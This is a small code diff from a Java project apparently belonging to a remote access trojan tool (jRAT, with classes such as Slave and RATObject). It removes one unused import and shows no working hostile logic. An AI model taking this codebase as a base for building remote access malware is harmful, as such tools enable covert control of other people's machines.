@@ -13,7 +13,6 @@ import org.jrat.project.api.RATObject;
 
 import com.redpois0n.Main;
 import com.redpois0n.Slave;
-import com.redpois0n.net.ConnectionHandler;
 import com.redpois0n.packets.outgoing.AbstractOutgoingPacket;
 
 public class RATObjectFormat {
